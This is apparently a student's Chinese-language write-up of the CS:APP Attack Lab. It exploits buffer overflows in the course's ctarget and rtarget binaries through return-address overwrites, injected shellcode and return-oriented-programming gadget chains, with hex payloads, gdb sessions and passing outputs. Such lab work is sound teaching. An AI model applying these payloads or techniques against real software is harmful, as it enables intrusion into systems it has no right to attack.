# 任务理解
> 具体请详细阅读[readme](http://csapp.cs.cmu.edu/3e/README-attacklab)和[writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf)


简单来说，ctarget和rtarget是两个有buffer overflow bug的程序。我们需要通过code injection(代码注入) 和 returned-oritened programming（返回导向编程）的方式攻击这两个程序。

而这个bug的来源就是他们会通过标准化输入读取一段字符串，并存到栈上。

测试方法如下：
```
    unix> ./hex2raw < xxx.txt | ./ctarget -q
```
xxx.txt 就是输入的内容。要求输入为16进制数字对，用空格隔开。

上述方法可能问题，可以用下列方式
```
./hex2raw < xxx.txt > xxx-raw.txt
./ctarget -i xxx-raw.txt -q
```


# 基础知识
1. call指令
   将PC值压入栈空，jmp到函数所在为止
2. ret指令
   pop PC

# 准备工作
- 反汇编ctarget
```
objdump -S ctarget > ctarget.lst
```
- 可以安装gdb插件gdb-peda，方便调试

## 程序入口test函数
```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	call   4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	call   400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	ret    
```
## getbuf

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret   
```
栈空间分配了0x28 = 40B空间，这个空间用来存放标准输入的数据。

# touch1

``` asm
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	call   400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	call   401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	call   400e40 <exit@plt>
```
为了让test调用完getbuf()后，不会回到test函数，而是跳转到touch1()，需要修改栈中存储的PC值。
那么可以通过传入字符串填满getbuf()栈空间，并且修改栈中的PC值，所以传入字符串大小大于40B，40B数据后为touch1地址。
touch1.txt如下，注意每一行最后需要有空格，否则转为16进制有点问题
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 
```
---
实验结果：
```
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
```
# touch2

## 分析任务要求

在touch1中看到终端显示：
Cookie: 0x59b997fa

touch2地址=00000000004017ec

touch2函数在writeup中有C语言代码，可以看出，touch2是将输入参数与cookie比较，如果相等才能成功

现在解决level2问题有以下关键点：
1. getbuf后跳转到touch2。在getbuf后注入一段代码，通过ret执行这个操作（注入代码）。和touch1操作不同是除了跳转还要执行特定代码。因此test栈的ret值 = 注入代码位置
2. touch2输入参数为cookie值，也就是将cookie值存放到%rdi。
3. 这段注入代码注入的位置在哪里？--getbuf函数栈中，不妨放在栈顶位置

## 注入代码
```asm
mov $0x59b997fa, %rdi # 输入参数 = cookie
push $0x4017ec  # touch2函数地址入栈
ret
```
将上述汇编代码touch2.s转为16进制代码：
```
unix> gcc -c touch2.s
unix> objdump -d touch2.o > touch2.d
```

touch2.d内容如下：

```asm

touch2.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	push   $0x4017ec
   c:	c3                   	ret    
```
## 注入位置
在getbuf函数内部打断点，然后运行查看当前的栈顶位置
```
gdb-peda$ p/x $rsp
$1 = 0x5561dc78
```

我这里一开始调试看到的rsp值不对，用gdb peda单步调试后查看到了正确的rsp值, 
```
b getbuf
r -q -i cookie.txt 
stepi
p/x $rsp
q
```

## 最终输入touch2.txt

```
48 c7 c7 fa 97 b9 59 68 ==> 栈顶 注入代码
ec 17 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00 ==> 栈底 注入代码位置
```

测试结果如下：
```
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```
# touch3
touch3()函数会调用hexmatch(cokkie. sval)函数，在hexmatch中会分配一个110B的cbuf数组，将cookie的值按格式化字符串"59b997fa"输出到这个数字的一个随机位置，然后比较sval和格式化字符串的前9个字节。

关键问题：
- cookie格式化字符串对应的ascii码是啥？
  - 35 39 62 39 39 37 66 61
  - [string2ascii tool](https://www.asciim.cn/m/tools/convert_string_to_ascii.html)
- getbuf后跳转到touch3位置00000000004018fa
- touch3输入参数是字符串所在位置，那么这个字符串放在哪里？怎么将字符串指针传入touch3？
  - getbuf后会跳转到touch3函数，此时touch3栈自动销毁，touch3会建立新的函数栈，因此这个字符串应该放在test栈中，比如test函数栈顶
  - 怎么将cookie对应的ascii码写到test栈顶呢？显然和前面的方式一样，getbuf分配的是40B,只需要在40B之后写ascii码就能覆盖test栈帧
- 注入代码位置？
  - 和touch2一样，放在getbuf的栈中

整个栈内布局情况：
|内容|栈位置|
|----|----|
|cookie ascii 码| |
|注入代码的位置|返回地址|
|。。。。|填充字符|
|ret| |
|pushq touch3地址| |
|rdi = cookie地址|----|
  
getbuf退出时：
1. 执行ret = pop and jmp, 因此从栈中弹出返回地址，跳转到注入代码处
2. 执行注入代码
   1. 将cookie地址传入rdi寄存器作为touch3的第一个输入参数
   2. touch3地址入栈
   3. 执行ret，将touch3地址pop，并跳转到touch3
   
## 获取test函数的栈顶位置
在call getbuf前打断点，然后查看rsp值,此时是test 函数的栈顶位置
```
xxx:~/work/CSAPP3e-lab-self-study/03-attack$ gdb ctarget 
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04.2) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
--Type <RET> for more, q to quit, c to continue without paging--c
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ctarget...
gdb-peda$ b *0x40196c
Breakpoint 1 at 0x40196c: file visible.c, line 92.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x55586000 --> 0x0 
RCX: 0x0 
RDX: 0x5561dcc0 --> 0xf4f4f4f4f4f4f4f4 
RSI: 0xf4 
RDI: 0x55685fd0 --> 0x0 
RBP: 0x55685fe8 --> 0x402fa5 --> 0x3a6968003a697168 ('hqi:')
RSP: 0x5561dca8 --> 0x9 ('\t')
RIP: 0x40196c (<test+4>:        mov    eax,0x0)
R8 : 0x0 
R9 : 0x0 
R10: 0x7ffff7c0be98 --> 0xf001a00007c15 
R11: 0x7ffff7da0f80 (<__memset_avx2_unaligned_erms>:    endbr64)
R12: 0x4 
R13: 0x0 
R14: 0x0 
R15: 0x7ffff7ffd040 --> 0x7ffff7ffe2e0 --> 0x0
EFLAGS: 0x212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40195e <touch3+100>:       mov    edi,0x0
   0x401963 <touch3+105>:       call   0x400e40 <exit@plt>
   0x401968 <test>:     sub    rsp,0x8
=> 0x40196c <test+4>:   mov    eax,0x0
   0x401971 <test+9>:   call   0x4017a8 <getbuf>
   0x401976 <test+14>:  mov    edx,eax
   0x401978 <test+16>:  mov    esi,0x403188
   0x40197d <test+21>:  mov    edi,0x1
[------------------------------------stack-------------------------------------]
0000| 0x5561dca8 --> 0x9 ('\t')
0008| 0x5561dcb0 --> 0x401f24 (<launch+112>:    cmp    DWORD PTR [rip+0x2025bd],0x0        # 0x6044e8 <is_checker>)
0016| 0x5561dcb8 --> 0x0 
0024| 0x5561dcc0 --> 0xf4f4f4f4f4f4f4f4 
0032| 0x5561dcc8 --> 0xf4f4f4f4f4f4f4f4 
0040| 0x5561dcd0 --> 0xf4f4f4f4f4f4f4f4 
0048| 0x5561dcd8 --> 0xf4f4f4f4f4f4f4f4 
0056| 0x5561dce0 --> 0xf4f4f4f4f4f4f4f4 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, test () at visible.c:92
92      visible.c: 没有那个文件或目录.
gdb-peda$ p/x $rsp
$1 = 0x5561dca8
```
---
最开始我的gdb流程是：
```
gdb ctarget
b test
p/x $rsp  ==>此时rsp = 0x5561dcb0
```
原因是当前还没分配栈空间，刚执行到
```
[-------------------------------------code-------------------------------------]
   0x401959 <touch3+95>:        call   0x401d4f <fail>
   0x40195e <touch3+100>:       mov    edi,0x0
   0x401963 <touch3+105>:       call   0x400e40 <exit@plt>
=> 0x401968 <test>:     sub    rsp,0x8
   0x40196c <test+4>:   mov    eax,0x0
   0x401971 <test+9>:   call   0x4017a8 <getbuf>
   0x401976 <test+14>:  mov    edx,eax
   0x401978 <test+16>:  mov    esi,0x403188
[------------------------------------stack-------------------------------------]
```

所以调整gdb流程：
```
gdb ctarget
b test
stepi
p/x $rsp  ==>此时rsp = 0x5561dca8
```
当前的rsp才是正确的。


## 注入代码
  
```
mov $0x5561dca8,%rdi # 存放ascii码的指针，即test ret上一个位置
push $0x4018fa # 
ret
```

```
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00 ==> 注入代码
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 ==> 注入代码位置
35 39 62 39 39 37 66 61 ==> cookie ascii码
```

## 测试结果
```
eve@eve-Inspiron-7560:~/work/CSAPP3e-lab-self-study/03-attack$ ./ctarget -q -i t3raw.txt 
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
```
# phase4
重复phase2的攻击过程，但要是使用gadgets

> Gadgets是指一些小的、独立的机器指令段。攻击者可以组合这些指令来构建一个更复杂的攻击。例如，这些gadgets通常由一些基本的x86-64指令（如movq、popq、ret等）组成。

```
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
```
0x4017ec
0x59b997fa
pop %rdi; ret( pop -> pc and jmp)

在start farm到end farm 中使用相应的gadget


step4. movq %rax, %rdi -- 48 89 c7
step3. ret -- c3

```
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq     
```
**4019C5**

cookie value = 0x59b997fa

step2. popq, %rax -- rax = cookie, 58
step1. ret --> jmpto gadget1

```
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq 
```

**0x4019AB**

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
ab 19 40 00 00 00 00 00 
fa 97 b9 59 00 00 00 00 
c5 19 40 00 00 00 00 00 
```

# phase5
invoke touch3 with 指向字符串cookie的指针

cookie放在一个固定位置?no, 需要通过rsp+offset获取位置

**0x401AAD**

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 // getbuf 40B

ad 1a 40 00 00 00 00 00 // movq %rsp, %rax; retq
00 00 00 00 00 00 00 00 // pop %xxx;retq
00 00 00 00 00 00 00 00 // offset = %xxx
00 00 00 00 00 00 00 00 // %rdi = %rsp + %xxx ==> leaq指令可以实现
fa 18 40 00 00 00 00 00 // touch3 addr
35 39 62 39 39 37 66 61 // cookie ascii
```

leaq a(b, c, d), %rax 先计算地址a + b + c * d，然后把最终地址载到寄存器rax中。

```
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   
```

%rax = %rdi + %rsi * 1

在phase4可知，只有pop %rax
```
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq 
```

```
ad 1a 40 00 00 00 00 00 // movq %rsp, %rax; retq
c5 19 40 00 00 00 00 00 // movq %rax, %rdi; retq ==> rdi = rsp (这里才是rsp)

ab 19 40 00 00 00 00 00 // pop %rax;retq   ==> rax = offset
48 00 00 00 00 00 00 00 // offset 

dd 19 40 00 00 00 00 00 // %edx = %eax， movl %eax, %edx; retq
70 1a 40 00 00 00 00 00 // %ecx = %edx;  movl %edx, %ecx; retq
13 1a 40 00 00 00 00 00 // %rsi = %ecx;  movl %ecx, %esi; retq 倒着找快一点

d6 19 40 00 00 00 00 00 // %rax = %rdi + %rsi * 1
c5 19 40 00 00 00 00 00 // %rdi = %rax; movq %rax, %rdi; retq

fa 18 40 00 00 00 00 00 // touch3 addr
35 39 62 39 39 37 66 61 // cookie ascii
```

offset = 8*9 = 72 = 0x48

```
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
```
0x4019ab

```
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   
```
0x4019c5

```
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3   
```
0x4019c5

```
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq  
```
0x4019dd

0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	retq   

  0x401a13

0000000000401a6e <setval_167>:
  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
  401a74:	c3                   	retq   
 0x401a70

完整的输入
```
```

```
unix> ./rtarget -q -i t5raw.txt 
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
```
